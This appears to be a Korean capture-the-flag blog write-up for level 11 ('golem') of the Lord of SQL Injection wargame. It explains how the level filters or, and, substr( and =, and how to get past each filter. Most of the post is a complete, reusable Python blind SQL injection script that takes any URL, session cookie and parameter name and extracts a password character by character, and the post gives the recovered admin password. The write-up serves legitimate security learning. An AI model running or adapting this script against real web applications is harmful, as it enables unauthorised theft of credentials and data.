---
title: LOS - 11번 golem
category: Lord of SQL Injection
---

# [11] golem

## 문제

<img  src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fde8A6H%2FbtrniTeLG61%2Fp8roAQzC5qnjr2AfgsXGW1%2Fimg.png">

## 풀이

이번 문제에서는


① or/and

② substr(

③ =


를 필터링하고 있다.

<br>

또한 근본적으로는 pw를 알아야 풀 수 있는 Blind SQLi 문제이다. (∵ addslashes) 

이전에 써먹었던 **자동화 코드**에 **필터링 우회**를 적용해주면 될 것 같다.

<br> 

먼저, 자동화 코드의 **check_length()** 를 다음과 같이 수정해준다.


```python
def check_length(url, cookie, param_name):
    head = {"PHPSESSID":f"{cookie}"}
    print("대상 문자열의 길이를 확인중입니다..")
    for num in range(0,30):
        param=f"?{param_name}=' || id like \"admin\" %26%26 length({param_name})>{num} %23"
        my_url=url+param
        res=requests.get(my_url, cookies=head)
        if("Hello admin" not in res.text):
            return num
```


① or ⇒ \|\|

② and ⇒ %26%26

③ = ⇒ like (문자열 일치 확인)

④ = ⇒ > (ASCII 대소 비교)

- 숫자를 점점 올려가며 비교하기 때문에, 최초로 Hello admin이 뜨지 않는 경우가 곧 아스키가 일치하는 경우이다.

 
<br>
 

다음으로는 **blind_sqli()** 를 다음과 같이 수정해준다.

```python
def blind_sqli(url, cookie, param_name, length):
    head = {"PHPSESSID":f"{cookie}"}
    ans=""
    for len in range(1, length+1):
        print(f"{len}번째 문자에 대해 검색중입니다..")
        for ran in range(32,127):
            param=f"?{param_name}=' || id like \"admin\" %26%26 ascii(substring({param_name},{len},1))>{ran} %23"
            my_url=url+param
            res=requests.get(my_url, cookies=head)
            if("Hello admin" not in res.text):
                print(f"{len}번째 문자 ⇒ {chr(ran)}")
                ans+=chr(ran)
                break
    return ans
```


① or ⇒ \|\|

② and ⇒ %26%26

③ substr( ⇒ substring(

④ = ⇒ like (문자열 일치 확인)

⑤ = ⇒ > (ASCII 대소 비교)

- 마찬가지로, 숫자를 점점 올려가며 비교하기 때문에, 최초로 Hello admin이 뜨지 않는 경우가 곧 아스키가 일치하는 경우이다.

 
<br>
 

**수정된 Python 자동화 코드의 전문**은 다음과 같다.


```python
import requests

def check_length(url, cookie, param_name):
    head = {"PHPSESSID":f"{cookie}"}
    print("대상 문자열의 길이를 확인중입니다..")
    for num in range(0,30):
        param=f"?{param_name}=' || id like \"admin\" %26%26 length({param_name})>{num} %23"
        my_url=url+param
        res=requests.get(my_url, cookies=head)
        if("Hello admin" not in res.text):
            return num

def blind_sqli(url, cookie, param_name, length):
    head = {"PHPSESSID":f"{cookie}"}
    ans=""
    for len in range(1, length+1):
        print(f"{len}번째 문자에 대해 검색중입니다..")
        for ran in range(32,127):
            param=f"?{param_name}=' || id like \"admin\" %26%26 ascii(substring({param_name},{len},1))>{ran} %23"
            my_url=url+param
            res=requests.get(my_url, cookies=head)
            if("Hello admin" not in res.text):
                print(f"{len}번째 문자 → {chr(ran)}")
                ans+=chr(ran)
                break
    return ans

if __name__ == "__main__":
    print("💘 Blind 공격을 시작합니다")
    
    url=input("URL을 입력하세요:")
    cookie=input("cookie를 알려주세요:")
    param_name=input("파라미터의 이름을 알려주세요:")
    
    length=check_length(url, cookie, param_name)
    print(f"👏 {param_name}의 길이는 {length}입니다.")
    
    ans=blind_sqli(url, cookie, param_name, length)
    print(f"👏 {param_name}의 정체는 {ans}입니다!")
    
    exit
```

<img  src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FHcecl%2FbtrnkxIU6Hk%2FwUsmDKLf63bp6zlHii4aZ0%2Fimg.png">

Blind 공격 결과, admin의 pw는 `77d6290b` 임을 알 수 있다.

## 결과

<img  src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbHY8zw%2FbtrnkvRSuaC%2FiiZqhAuhNLq6tKpRIWSj20%2Fimg.png">